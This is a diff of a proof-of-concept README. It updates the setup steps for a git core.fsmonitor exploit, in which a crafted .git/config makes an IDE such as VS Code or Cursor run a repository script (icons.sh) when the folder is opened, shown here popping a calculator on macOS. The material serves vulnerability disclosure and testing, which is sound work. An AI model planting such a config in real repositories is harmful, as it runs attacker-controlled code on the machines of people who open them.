@@ -7,23 +7,11 @@ Which allows `git` to spawn the configured helper which executes attacker contro
 Proof-of-work, `git clone` this repo add the below config under your `.git` directory. Once done open the crafted folder with IDE, a calculator should pop. (I have tested this with Code & Cursor). This POC is macOS specfic modify it according to your env.
 
 ```bash
-bash-3.2$ cd git-fsmonitor
-bash-3.2$ mkdir .git
-bash-3.2$ nano .git/config
-[core]
-	repositoryformatversion = 0
-	filemode = true
-	bare = false
-	logallrefupdates = true
-	ignorecase = true
-	precomposeunicode = true
-	fsmonitor = ./icons/icons.sh
-bash-3.2$ chmod +x ./icons/icons.sh
-bash-3.2$ git init
-bash-3.2$ git config core.fsmonitor ./icons/icons.sh
-bash-3.2$ ls git-fsmonitor-main/.git/
-.DS_Store    config       description  HEAD         hooks/       info/        objects/     refs/        
-bash-3.2$
+cd git-fsmonitor
+printf '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n\tignorecase = true\n\tprecomposeunicode = true\n\tfsmonitor = ./icons/icons.sh\n' > .git/config
+chmod +x ./icons/icons.sh
+git init
+git config core.fsmonitor ./icons/icons.sh
 ```
 **Tested on Code**
 
